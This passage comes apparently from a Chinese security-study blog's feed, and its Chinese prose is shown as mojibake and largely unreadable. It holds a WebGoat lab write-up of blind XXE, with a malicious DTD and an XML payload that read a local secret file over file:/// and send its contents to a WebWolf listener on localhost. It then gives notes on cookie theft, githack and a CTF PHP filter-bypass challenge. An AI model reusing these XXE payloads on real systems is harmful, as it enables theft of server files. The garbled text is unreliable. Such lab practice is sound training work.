class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/underline-learning/image-20221015200758568.png" alt="image-20221015200758568"></p><p>æˆåŠŸ</p><h3 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h3><h4 id="å‰è¨€ï¼š-2"><a href="#å‰è¨€ï¼š-2" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æœ¬ä½œä¸šä¸­å°è¯•åˆ¶ä½œä¸€ä¸ª DTDï¼Œå®ƒå°†æ–‡ä»¶ secret.txt çš„å†…å®¹ä» WebGoat æœåŠ¡å™¨ä¸Šä¼ åˆ°æˆ‘ä»¬çš„ WebWolf æœåŠ¡å™¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ WebWolf ä¸ºæ‚¨çš„ DTD æä¾›æœåŠ¡ã€‚secret.txt ä½äºæ­¤ä½ç½®çš„ WebGoat æœåŠ¡å™¨ä¸Šï¼Œå› æ­¤æ‚¨æ— éœ€æ‰«ææ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼š</span><br><span class="line"></span><br><span class="line">ä½                  åœ°ç‚¹</span><br><span class="line">Windows <span class="number">10</span>            C:\Users\Ttoc<span class="regexp">/.webgoat-8.2.2/</span><span class="regexp">/XXE/</span>secret.txt</span><br><span class="line"></span><br><span class="line">å°è¯•ä½¿ç”¨ WebWolf ç™»å½•é¡µé¢ä¸Šä¼ æ­¤æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šï¼ˆ æ³¨æ„ï¼šæ­¤ç«¯ç‚¹ç”±æ‚¨å®Œå…¨æ§åˆ¶ï¼‰ä¸€æ—¦æ‚¨è·å¾—æ–‡ä»¶çš„å†…å®¹ï¼Œå°†å…¶ä½œä¸ºæ–°è¯„è®ºå‘å¸ƒåœ¨é¡µé¢ä¸Šï¼Œæ‚¨å°†è§£å†³è¯¾ç¨‹ã€‚http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9090</span>/landing</span><br></pre></td></tr></table></figure><p>ç›²æ³¨å°±æ˜¯æ²¡æœ‰å›æ˜¾å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬ç›®æ ‡æœåŠ¡å™¨çš„æ•æ„Ÿæ–‡ä»¶å†…å®¹è·å–åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç®€è€Œè¨€ä¹‹ï¼Œ</span><br><span class="line"></span><br><span class="line">webgoatå¼€å¯äº†ç«™ç‚¹ï¼Œè¿™ä¸ªç«™ç‚¹æœ‰XXEï¼ŒwebgoatæœåŠ¡å™¨ä¸Šæœ‰ä¸ªå¯†ç æ–‡ä»¶ï¼Œé€šè¿‡XXEæŠŠè¿™ä¸ªå¯†ç æ–‡ä»¶è¯»å–ï¼Œå¹¶ä¸”å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„æ¶æ„ç«™ç‚¹webwolfï¼Œwebwolfæ¥å—åˆ°è¿™ä¸ªè¯·æ±‚å°±é¡ºç†æˆç« è·å–äº†å¯†ç æ–‡ä»¶é‡Œé¢çš„å¯†ç </span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦åˆ©ç”¨<code>xml</code>é€šè¿‡<code>DTD</code>å®ç°æ–‡ä»¶åŒ…å«ï¼Œ</p><p>å…ˆæŠŠæˆ‘ä»¬è‡ªå·±å†™çš„<code>DTD</code>æ–‡ä»¶åŒ…å«åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨<code>webwolf</code>ï¼Œç„¶ååœ¨<code>webgoat</code>ä¸Šé€šè¿‡<code>xxe</code>è¿›è¡Œè¿œç¨‹åŒ…å«æˆ‘ä»¬ç«™ç‚¹çš„è¿™ä¸ª<code>DTD</code>æ–‡ä»¶ï¼Œç„¶å<code>webgoat</code>åœ¨è§£ææˆ‘ä»¬çš„<code>DTD</code>æ–‡ä»¶çš„æ—¶å€™å°±ä¼šæŠŠ<code>secret.txt</code>æ–‡ä»¶å†…å®¹èµ‹å€¼åˆ°æ–‡ä»¶å¹¶ä½œä¸ºå‚æ•°å‘é€åˆ°æˆ‘ä»¬çš„<code>webwolf</code>æœåŠ¡å™¨</p><hr><p>æˆ‘ä»¬å…ˆå‘é€è¯„è®ºçœ‹çœ‹</p><p>è¿™é‡Œå‘é€çš„æ˜¯ç©ºå†…å®¹ï¼Œå›æ˜¾çš„å†…å®¹çœ‹æ¥æ˜¯æç¤ºï¼Œ</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">éœ€è¦æˆ‘ä»¬å…ˆåœ¨`webwolf`ä¸Šä¸Šä¼ æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/underline-learning/image-20221017201611949.png" alt="image-20221017201611949"></p><p>æˆ‘ä»¬å…ˆæŠ“åŒ…çœ‹çœ‹webgoatçš„è¯„è®ºçš„è§£ææ ¼å¼æ˜¯æ€ä¹ˆæ ·çš„</p><p><img src="/2022/06/21/underline-learning/image-20221017201938082.png" alt="image-20221017201938082"></p><p>çœ‹æ¥æ˜¯æ­£å¸¸çš„<code>xml</code>è§£æ</p><p>æˆ‘ä»¬å…ˆåœ¨<code>webwolf</code>ä¸Šä¸Šä¼ æˆ‘ä»¬çš„<code>evil.dtd</code>æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//å£°æ˜å˜é‡ write å¹¶åµŒå¥—èµ‹å€¼<span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://localhost:9090/landing?text=%file;&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ä¸ºä»€ä¹ˆè¿˜è¦ç”¨ä¸€ä¸ªå‚æ•°å®ä½“åµŒå¥—å‘¢ï¼Ÿ</span><br><span class="line">å› ä¸ºå¦‚æœæˆ‘ä»¬ç”¨ä¸€ä¸ªwriteå‚æ•°å®ä½“å°†sendå¤–éƒ¨å®ä½“çš„å®šä¹‰å†™è¿›è¯·æ±‚ä¸­ï¼Œåœ¨%write;æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œ%fileä¹Ÿä¼šè¢«æ›¿æ¢æˆç›¸åº”çš„æ–‡æœ¬ã€‚å› æ­¤æœ€åï¼Œ?textåé¢çš„å€¼å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å†…å®¹</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/underline-learning/image-20221017205520515.png" alt="image-20221017205520515"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œçš„å˜é‡èµ‹å€¼å’Œå‰é¢çš„ä¸åŒ</span><br><span class="line">å®ƒæ˜¯</span><br><span class="line"><span class="comment">%ï¼ˆç©ºæ ¼ï¼‰å˜é‡å</span></span><br><span class="line">è¿™ç§å‘½åçš„æ–¹å¼çš„å˜é‡åªèƒ½åœ¨DTDé‡Œç”¨ï¼Œè€Œåœ¨xmlé‡Œç”¨ä¸äº†</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/underline-learning/image-20221017211907400.png" alt="image-20221017211907400"></p><p>ä¸Šä¼ æˆåŠŸåæˆ‘ä»¬åœ¨<code>incoming requests</code>é‡Œçœ‹åˆ°ä¸Šä¼ è·¯å¾„ï¼Œè¿™æ ·åœ¨<code>webgoat</code>å°±è°ƒç”¨è®¿é—®åŒ…å«å°±è¡Œäº†</p><p><img src="/2022/06/21/underline-learning/image-20221017211827208.png" alt="image-20221017211827208"></p><p>ç„¶åæˆ‘ä»¬å†åœ¨<code>webgoat</code>æŠ“åŒ…æ•°æ®é‡Œæ„é€ æˆ‘ä»¬çš„<code>payload</code></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Users/Ttoc/.webgoat-8.2.2/XXE/secret.txt&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//è¿™ä¸ªè·¯å¾„æ˜¯æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå› ä¸ºåœ¨æ‰§è¡Œjaræ–‡ä»¶çš„æ—¶å€™ï¼Œè‡ªåŠ¨ç”Ÿæˆäº†è¿™ä¸ªæ–‡ä»¶</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">getdtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/ttocplus/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//æ³¨æ„è¿™é‡Œæ˜¯ä¸Šä¼ è·¯å¾„ï¼Œè¦å†™è‡ªå·±çš„</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%getdtd; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%write;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//åœ¨%getdtd;åé¢è°ƒç”¨%write;</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="symbol">&amp;send;</span> </span></span><br><span class="line"><span class="language-xml">     //å†è°ƒç”¨%writeé‡Œçš„&amp;sendå˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯å†åµŒå¥—çš„DTDè¯­å¥ä¸­å£°æ˜ï¼Œæ‰€ä»¥éœ€è¦åœ¨xmlé‡Œè°ƒç”¨</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>è™½ç„¶æç¤ºæ˜¯æŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬åˆ°æˆ‘ä»¬çš„<code>webwolf</code>ä¸ŠæŸ¥çœ‹</p><p><img src="/2022/06/21/underline-learning/image-20221018140310837.png" alt="image-20221018140310837"></p><hr><p>è¿™ä¸ªæ˜¯<code>secret.txt</code>çš„å€¼ï¼Œæˆ‘ä»¬çœ‹çœ‹<code>webwolf</code>ä¸Šæœ‰æ²¡æœ‰è·å¾—è¯¥æ•°æ®</p><p><img src="/2022/06/21/underline-learning/image-20221017234256596.png" alt="image-20221017234256596"></p><hr><p>æˆåŠŸè·å–</p><p><img src="/2022/06/21/underline-learning/image-20221018141126472.png" alt="image-20221018141126472"></p><p>æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/05/31/daily/"/>
      <url>/2022/05/31/daily/</url>
      
        <content type="html"><![CDATA[<p><code>éšä¾¿è®°ä¸€ä¸‹ï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹ä¸­çš„å­¦ä¹ ç»éªŒï¼Œæ¬¢è¿æŒ‡æ­£å’Œè¡¥å……</code></p><span id="more"></span><h1 id="å­¦ä¹ éšè®°"><a href="#å­¦ä¹ éšè®°" class="headerlink" title="å­¦ä¹ éšè®°"></a>å­¦ä¹ éšè®°</h1><h1 id="1-ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³"><a href="#1-ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³" class="headerlink" title="1.ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³"></a>1.ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’Œ<u><strong>Cookie</strong></u>è§£å†³</h1><p>ä»Šå¤©åœ¨æ‰“buuctfé¶åœºçš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“é¡µé¢è·³è½¬æ—¶ï¼Œä¼šæ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œå¯¼è‡´æˆ‘çš„sqlæ³¨å…¥ç»“æœä¸èƒ½æ˜¾ç¤ºï¼Œç„¶åç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°å¯èƒ½æ˜¯æµè§ˆå™¨ç¼“å­˜å¤ªå¤šå¯¼è‡´çš„ï¼Œäºæ˜¯æˆ‘æŠŠæµè§ˆå™¨çš„ç¼“å­˜å’Œcookieä¸€åŒå…¨éƒ¨æ¸…ç©ºï¼Œç„¶åæˆ‘å†åˆ·æ–°sql æ³¨å…¥é‚£é“é¢˜çš„ç•Œé¢ï¼Œè§£å†³äº†ï¼Œæ²¡æœ‰å†æ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œä¹Ÿæ˜¾ç¤ºäº†æˆ‘çš„æ³¨å…¥ç»“æœï¼Œæˆ‘æ­£è¦äº¤flagçš„æ—¶å€™ï¼Œç„¶åï¼Œæˆ‘å‘ç°â€¦..ï¼Œæˆ‘çš„buuctfè´¦å·ä¸‹çº¿ï¼Œæˆ‘çš„csdnè´¦å·ä¹Ÿä¸‹çº¿äº†</p><p>cookieçš„ä½œç”¨å’Œé‡è¦æ€§å°±å‡ºæ¥äº†ï¼Œä»è¿™ä¸ªäº‹æƒ…çœ‹å‡ºï¼Œcookieæ˜¯å½“æˆ‘ä»¬ç™»å½•ç½‘ç«™çš„ä¸»è¦èº«ä»½å‡­è¯ï¼Œå½“æˆ‘åˆ é™¤cookieåï¼Œæˆ‘æ— æ³•è¯æ˜è‡ªå·±èº«ä»½æ—¶ï¼Œå³ç½‘ç«™å½“å‰æµè§ˆå™¨æ— è¯¥è´¦å·å½“å‰åœ¨è¯¥ç½‘ç«™çš„cookieæ—¶ï¼Œç½‘ç«™å°±ä¼šå¼ºåˆ¶ä¸‹çº¿æˆ‘çš„è´¦å·</p><p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ç™»å½•ç½‘ç«™æ—¶ï¼ˆæ²¡æœ‰é€€å‡ºï¼‰ï¼Œç‚¹å‡»äº†å…¶ä»–é“¾æ¥å¯¼è‡´è‡ªå·±åœ¨è¯¥æµè§ˆå™¨çš„è¯¥ç½‘ç«™çš„cookieå¤–æ³„ï¼Œè¢«æœ‰å¿ƒäººè·å–ï¼Œé‚£ä¹ˆæ‹¥æœ‰ä½ çš„cookieçš„äººï¼Œå°±å¯ä»¥ç™»å½•ä½ çš„è´¦å·ï¼Œåœ¨ä½ ç™»å½•çš„ç½‘ç«™ä¸Šè¿›è¡Œä¿®æ”¹å¯†ç ï¼Œåˆ é™¤æ–‡ç« ï¼Œç”šè‡³å¯ä»¥è½¬è´¦ç­‰ç­‰</p><p>æ‰€ä»¥ä»¥åç™»å½•äº†ä¸€äº›é‡è¦ç½‘ç«™æ—¶ï¼Œæ¯”å¦‚æ”¯ä»˜å®ï¼Œæ·˜å®ï¼Œåšå®¢ç½‘ç«™æ—¶ï¼Œåˆ«éšä¾¿ç‚¹å‡»é“¾æ¥ï¼Œä¿è¯è‡ªå·±çš„ä¿¡æ¯å®‰å…¨ï¼Œä¸è¦é»‘å®¢è¢«é»‘å®¢é»‘äº†ï¼Œé‚£ç¡®å®æœ‰ç‚¹éš¾ä¸ºæƒ…äº†</p><blockquote><p><code>Cookieå®é™…ä¸Šæ˜¯ä¸€å°æ®µçš„æ–‡æœ¬ä¿¡æ¯ã€‚å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦è®°å½•è¯¥ç”¨æˆ·çŠ¶æ€ï¼Œå°±ä½¿ç”¨responseå‘å®¢æˆ·ç«¯æµè§ˆå™¨é¢å‘ä¸€ä¸ªCookieã€‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šæŠŠCookieä¿å­˜èµ·æ¥ã€‚å½“æµè§ˆå™¨å†è¯·æ±‚è¯¥ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨æŠŠè¯·æ±‚çš„ç½‘å€è¿åŒè¯¥Cookieä¸€åŒæäº¤ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ£€æŸ¥è¯¥Cookieï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚æœåŠ¡å™¨è¿˜å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹Cookieçš„å†…å®¹</code></p></blockquote><h1 id="2-gitå‘½ä»¤"><a href="#2-gitå‘½ä»¤" class="headerlink" title="2.gitå‘½ä»¤"></a>2.gitå‘½ä»¤</h1><p>ä½¿ç”¨githackï¼Œè®°å½•ä¸€äº›å‘½ä»¤</p><p><img src="/2022/05/31/daily/image-20220729114811362.png" alt="image-20220729114811362"></p><h1 id="3-éšæ‰‹è®°å½•é¢˜ç›®"><a href="#3-éšæ‰‹è®°å½•é¢˜ç›®" class="headerlink" title="3.éšæ‰‹è®°å½•é¢˜ç›®"></a>3.éšæ‰‹è®°å½•é¢˜ç›®</h1><h2 id="1ï¼‰å¤´ç–¼çš„phpä»£ç å®¡è®¡"><a href="#1ï¼‰å¤´ç–¼çš„phpä»£ç å®¡è®¡" class="headerlink" title="1ï¼‰å¤´ç–¼çš„phpä»£ç å®¡è®¡"></a>1ï¼‰å¤´ç–¼çš„<code>php</code>ä»£ç å®¡è®¡</h2><p>ç¬¬ä¸€çœ¼å¾ˆå¤´ç–¼çš„<code>php</code>ä»£ç å®¡è®¡ï¼Œä½†çœ‹ç€å´æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„è€ƒç‚¹ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰é¢˜ç›®ï¼Œå°±åœ¨æœ¬åœ°è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡æ‰€æœ‰çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// code by SEC@USTC </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$URL</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]; </span><br><span class="line"><span class="comment">//echo &#x27;URL: &#x27;.$URL.&#x27;&lt;br/&gt;&#x27;; </span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;CTF&#123;???&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$flag</span>, <span class="string">&#x27;CTF&#123;???&#125;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./index.php&#x27;</span>)); </span><br><span class="line"><span class="variable">$stop</span> = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;./&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">1</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">2</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$matches</span> = <span class="keyword">array</span>(); </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9a-z\/.]+)$/&#x27;</span>, <span class="variable">$URL</span>, <span class="variable">$matches</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$matches</span>) || <span class="variable">$matches</span>[<span class="number">1</span>] != <span class="variable">$URL</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">3</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;//&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">4</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$URL</span>, -<span class="number">10</span>) !== <span class="string">&#x27;/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">5</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;p.&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">6</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="variable">$URL</span> == <span class="string">&#x27;/fan/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">7</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$stop</span>) <span class="variable">$stop</span> = <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$stop</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"><span class="keyword">for</span>(; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Not Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>, <span class="literal">TRUE</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4-æœ¬åœ°å›ç¯"><a href="#4-æœ¬åœ°å›ç¯" class="headerlink" title="4.æœ¬åœ°å›ç¯"></a>4.æœ¬åœ°å›ç¯</h1><blockquote><p>æœ¬åœ°å›ç¯åœ°å€ï¼ˆ<code>Loop back 